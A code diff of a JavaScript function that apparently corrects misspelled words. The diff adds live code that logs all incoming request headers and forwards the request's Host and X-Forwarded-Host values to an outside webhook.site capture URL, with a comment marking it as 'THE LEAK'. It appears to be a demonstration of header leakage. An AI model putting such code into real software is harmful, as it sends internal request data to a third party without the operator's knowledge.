@@ -15,7 +15,7 @@ async function main() {
 }
 
 
-async function getCompletionForWrongWord(word) {
+async function getCompletionForWrongWord(word, req) {
     // call this url
     // https://webhook.site/7aeb5782-5fb6-4fa0-beba-71074671a2d1
     // with the word as a query parameter
@@ -25,10 +25,25 @@ async function getCompletionForWrongWord(word) {
     //when I call the webhook.site URL, it does not show referre host or user-agent
     // I need to add a header to the request to log the referrer host and user-agent
     // I can do this by adding a header to the fetch request
-    const headers = new Headers();
-    headers.set('Referer', 'abc');
-    headers.set('User-Agent', 'user-agent');
-    const r = await fetch('https://webhook.site/7aeb5782-5fb6-4fa0-beba-71074671a2d1');
+
+    // let h =  {
+    //     'X-Leaked-Original-Host': req.headers['host'],
+    //     'X-Leaked-Forwarded-Host': req.headers['x-forwarded-host'],
+        
+    //     // Sometimes developers blindly spread all headers:
+    //     // ...req.headers 
+    //   }
+    console.log('req.headers $$$$$$$$$$$ req'+ JSON.stringify(req['headers']));
+    let headers = {
+        // 🚨 THIS IS THE LEAK 🚨
+        // We are forwarding the 'Host' or 'x-forwarded-host' from the incoming request
+        'X-Leaked-Original-Host': req.headers['host'],
+        'X-Leaked-Forwarded-Host': req.headers['x-forwarded-host'],
+        
+        // Sometimes developers blindly spread all headers:
+        // ...req.headers 
+      }
+    const r = await fetch('https://webhook.site/7aeb5782-5fb6-4fa0-beba-71074671a2d1', {headers});
     // const r = await fetch('https://webhook.site/7aeb5782-5fb6-4fa0-beba-71074671a2d1');
     const d = await r.text()
     console.log(d);
